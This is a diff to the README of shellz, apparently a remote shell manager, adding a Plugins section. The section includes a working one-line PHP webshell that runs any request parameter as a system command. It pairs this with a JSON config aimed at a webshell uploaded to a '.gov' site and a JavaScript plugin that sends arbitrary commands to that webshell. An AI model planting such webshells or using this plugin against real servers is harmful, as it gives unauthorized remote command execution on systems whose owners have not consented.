@@ -63,6 +63,51 @@ cat ~/.shellz/shells/tnas.json
 }
 ```
 
+### Plugins
+
+Instead of the two default types, `ssh` and `telnet`, you can specify a custom name, in which case shellz will try to use a user plugin. Let's start by creating a new shell json file `~/.shellz/shells/custom.json` with the following contents:
+
+```json
+{
+    "name": "custom",
+    "host": "http://www.imvulnerable.gov/uploads/sh.php",
+    "identity": "empty",
+    "port": 80,
+    "type": "mycustomshell"
+}
+```
+
+As you probably noticed, the `host` field is the full URL of a very simple PHP webshell uploaded on some website:
+
+```php
+<?php system($_REQUEST["cmd"]); die; ?>
+```
+
+Also, the `type` field is set to `mycustomshell`, in this case `shellz` will try to load the file `~/.shellz/plugins/mycustomshell.js` and use it to create a session and execute a command. 
+
+A `shellz` plugin must export the `Create`, `Exec` and `Close` functions, this is how `mycustomshell.js` looks like:
+
+```js
+var headers = {
+    'User-Agent': 'imma-shellz-plugin'
+};
+
+function Create(ctx) {
+    // log("Create(" + ctx + ")");
+    return ctx;
+}
+
+function Exec(ctx, cmd) {
+    // log("running " + cmd + " on " + ctx.Host);
+    var resp = http.Get(ctx.Host + "?cmd=" + cmd, headers)
+    return resp.Error ? resp.Error : resp.Raw;
+}
+
+function Close(obj) {
+    // log("Close(" + ctx + ")");
+}
+```
+
 ### Examples
 
 List available identities and shells:
